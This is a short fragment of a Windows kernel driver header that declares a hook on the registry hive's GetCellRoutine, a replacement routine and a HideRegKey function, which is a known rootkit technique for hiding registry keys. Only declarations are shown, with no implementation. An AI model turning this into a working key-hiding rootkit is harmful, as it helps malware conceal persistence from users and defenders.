#include "ntifs.h"

#pragma LOCKEDCODE
PGET_CELL_ROUTINE  pGetCellRoutine;

#pragma LOCKEDCODE
PGET_CELL_ROUTINE *ppGetCellRoutine;

#pragma LOCKEDCODE
WCHAR uHideKeyBuffer[256];

HANDLE OpenKeyByName( IN PCWSTR pwcsKeyName);
PVOID GetKeyControlBlock(IN HANDLE hKey);
PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node);
PVOID MyGetCellRoutine(PVOID Hive, HANDLE Cell);
BOOL HideRegKey(PCWSTR g_HideKeyName);